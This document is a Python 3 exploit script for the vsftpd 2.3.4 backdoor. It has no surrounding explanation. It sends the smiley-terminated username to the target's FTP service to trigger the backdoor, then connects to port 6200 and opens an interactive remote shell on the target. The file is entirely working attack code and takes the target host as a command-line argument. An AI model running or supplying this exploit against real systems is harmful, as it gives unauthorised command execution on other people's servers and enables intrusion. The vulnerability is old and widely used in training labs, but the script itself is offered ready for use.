#!/usr/bin/env python3

import socket
import argparse
import signal
import sys
import threading

def handler(sig, frame):
    print('\n[+] Exiting...')
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def connect_backdoor(host, port=6200):
    print(f"[+] Connecting to backdoor on {host}:{port}...")
    try:
        with socket.create_connection((host, port)) as s:
            print("[+] Success! Interactive shell opened.")
            print("[*] Type commands, or 'exit' to quit.")
            while True:
                cmd = input("shell> ")
                if cmd.strip().lower() == "exit":
                    break
                s.sendall((cmd + "\n").encode())
                try:
                    data = s.recv(4096).decode(errors='ignore')
                    print(data, end="")
                except:
                    print("[!] Connection closed.")
                    break
    except Exception as e:
        print(f"[!] Failed to connect to backdoor: {e}")

def trigger_backdoor(host, port=21):
    print(f"[+] Connecting to FTP server {host}:{port}...")
    try:
        with socket.create_connection((host, port)) as ftp:
            banner = ftp.recv(1024).decode()
            print(f"[+] Received banner: {banner.strip()}")
            if "vsFTPd 2.3.4" not in banner:
                print("[!] Warning: This doesn't look like vsftpd 2.3.4. Proceeding anyway.")
            ftp.sendall(b"USER nergal:)\n")
            ftp.recv(1024)  # Might not return anything
            ftp.sendall(b"PASS whatever\n")
            print("[+] Backdoor triggered. Trying to connect...")
    except Exception as e:
        print(f"[!] FTP interaction failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="vsftpd 2.3.4 Backdoor Exploit (Python 3)")
    parser.add_argument("host", help="Target IP or hostname")
    args = parser.parse_args()

    trigger_backdoor(args.host)
    connect_backdoor(args.host)
